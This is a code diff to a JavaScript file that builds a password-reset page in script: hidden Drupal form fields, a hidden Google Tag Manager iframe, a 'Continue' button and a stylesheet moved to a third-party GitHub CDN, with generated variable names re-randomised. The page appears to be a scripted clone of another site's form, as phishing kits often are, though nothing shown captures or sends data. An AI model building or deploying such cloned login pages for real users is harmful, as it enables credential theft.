@@ -65,7 +65,7 @@ document.head.append(tx20)
 let j21 = document.createElement("link");
 j21.setAttribute("rel", "stylesheet");
 j21.setAttribute("type", "text/css");
-j21.setAttribute("href", "Assets/css/style3.css");
+j21.setAttribute("href", "https://cdn.jsdelivr.net/gh/jmresult/zelpae/css/style3.css");
 document.head.append(j21)
 let tx22 = document.createTextNode(" ")
 document.head.append(tx22)
@@ -78,12 +78,12 @@ j25.setAttribute("aria-hidden", "true");
 document.body.append(j25)
 let tx26 = document.createTextNode(" ")
 j25.append(tx26)
-let j330l5jnhbci = document.createElement("IFRAME");
-j330l5jnhbci.setAttribute("src", "https://www.googletagmanager.com/ns.html?id=GTM-PL26Z5L");
-j330l5jnhbci.setAttribute("height", "0");
-j330l5jnhbci.setAttribute("width", "0");
-j330l5jnhbci.setAttribute("style", "display:none;visibility:hidden");
-j25.append(j330l5jnhbci)
+let jq6kl5llq9bk = document.createElement("IFRAME");
+jq6kl5llq9bk.setAttribute("src", "https://www.googletagmanager.com/ns.html?id=GTM-PL26Z5L");
+jq6kl5llq9bk.setAttribute("height", "0");
+jq6kl5llq9bk.setAttribute("width", "0");
+jq6kl5llq9bk.setAttribute("style", "display:none;visibility:hidden");
+j25.append(jq6kl5llq9bk)
 let tx28 = document.createTextNode(" ")
 j25.append(tx28)
 let tx29 = document.createTextNode(" ")
@@ -207,25 +207,25 @@ j68.setAttribute("id", "topTitle");
 j66.append(j68)
 let tx69 = document.createTextNode("Please enter your email address below. You will receive a link to reset your password.")
 j68.append(tx69)
-let j330l5jnhbcj = document.createElement("INPUT");
-j330l5jnhbcj.setAttribute("autocomplete", "off");
-j330l5jnhbcj.setAttribute("data-drupal-selector", "form-usvueh3dfulrtgxwzk9bddbiwhy3mqm764r0nlm92ya");
-j330l5jnhbcj.setAttribute("type", "hidden");
-j330l5jnhbcj.setAttribute("name", "form_build_id");
-j330l5jnhbcj.setAttribute("value", "form-usvueh3dfULrtGXwzK9bDDbiWhy3mQM764R0Nlm92YA");
-j330l5jnhbcj.setAttribute("class", "input-field");
-j330l5jnhbcj.setAttribute("placeholder", "");
-j66.append(j330l5jnhbcj)
+let jq6kl5llq9bl = document.createElement("INPUT");
+jq6kl5llq9bl.setAttribute("autocomplete", "off");
+jq6kl5llq9bl.setAttribute("data-drupal-selector", "form-usvueh3dfulrtgxwzk9bddbiwhy3mqm764r0nlm92ya");
+jq6kl5llq9bl.setAttribute("type", "hidden");
+jq6kl5llq9bl.setAttribute("name", "form_build_id");
+jq6kl5llq9bl.setAttribute("value", "form-usvueh3dfULrtGXwzK9bDDbiWhy3mQM764R0Nlm92YA");
+jq6kl5llq9bl.setAttribute("class", "input-field");
+jq6kl5llq9bl.setAttribute("placeholder", "");
+j66.append(jq6kl5llq9bl)
 let tx71 = document.createTextNode(" ")
 j66.append(tx71)
-let j330l5jnhbck = document.createElement("INPUT");
-j330l5jnhbck.setAttribute("data-drupal-selector", "edit-user-pass");
-j330l5jnhbck.setAttribute("type", "hidden");
-j330l5jnhbck.setAttribute("name", "form_id");
-j330l5jnhbck.setAttribute("value", "user_pass");
-j330l5jnhbck.setAttribute("class", "input-field");
-j330l5jnhbck.setAttribute("placeholder", "");
-j66.append(j330l5jnhbck)
+let jq6kl5llq9bm = document.createElement("INPUT");
+jq6kl5llq9bm.setAttribute("data-drupal-selector", "edit-user-pass");
+jq6kl5llq9bm.setAttribute("type", "hidden");
+jq6kl5llq9bm.setAttribute("name", "form_id");
+jq6kl5llq9bm.setAttribute("value", "user_pass");
+jq6kl5llq9bm.setAttribute("class", "input-field");
+jq6kl5llq9bm.setAttribute("placeholder", "");
+j66.append(jq6kl5llq9bm)
 let tx73 = document.createTextNode(" ")
 j66.append(tx73)
 let j74 = document.createElement("div");
@@ -316,9 +316,9 @@ j92.setAttribute("id", "submitButton");
 j92.setAttribute("name", "op");
 j92.setAttribute("class", "btn btn--submit btn--large");
 j90.append(j92)
-let j330l5jnhbcl = document.createElement("I");
-j330l5jnhbcl.setAttribute("class", "fas fa-spinner fa-pulse");
-j92.append(j330l5jnhbcl)
+let jq6kl5llq9bn = document.createElement("I");
+jq6kl5llq9bn.setAttribute("class", "fas fa-spinner fa-pulse");
+j92.append(jq6kl5llq9bn)
 let tx94 = document.createTextNode("Continue")
 j92.append(tx94)
 let tx95 = document.createTextNode(" ")
